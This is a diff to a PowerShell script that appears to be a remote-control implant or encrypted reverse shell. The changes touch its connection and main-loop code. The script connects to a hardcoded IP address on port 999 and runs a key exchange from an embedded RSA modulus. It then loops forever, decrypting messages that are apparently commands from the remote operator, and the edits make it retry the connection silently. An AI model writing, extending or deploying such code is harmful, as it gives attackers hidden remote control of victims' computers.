@@ -466,14 +466,13 @@ function Excmd
    
 }
 function Get-SockStream($client) {
-    while($true){
-        try{
-            return $client.connect()
-        }catch{
-            Start-Sleep -Seconds 2
-        }
+    try{
+        return $client.connect()
+    }catch{
+        return $false
     }
 }
+
 
 function Start-Main{
     $n = [System.Numerics.BigInteger]::Parse("24167402767654577565716389815235569967390138512024137497386480228714459623333728107550442019967341332053940559315871104193316625676287327705224404592395885695827727800334356656078494465334764933984362150328647642679827786023792149061377853406629987146126403665715498483598938424562357472270283226106922575054267526543955052845613720230410609968151396625485965130532490768894210017875706817812676831767822251026991167386779935369014898100686467230341800659314991606618373358316608131771884170257420378343129059831609845883841561567536343257616438711061881770390832717316958948348326818632753120572695814500526819624897")
@@ -483,13 +482,14 @@ function Start-Main{
         try{
             $client = [Client]::new('20.172.198.96', 999)
             $stream = Get-SockStream -client $client
-            Write-Host $stream
+            if ($stream -eq $false){
+                continue
+            }
             $ciphers = $client.sendKey($stream,$PUBLIC)
             $encryptionKey = $ciphers[0]
             $iv = $ciphers[-1]
             $randomal = $ciphers[-1]
             $aes = [AEScrypto]::new($encryptionKey,$iv)
-        
             while ($true){
                 $message = ($client.readmsg($stream))
                 $reader = $aes.decrypt($message)
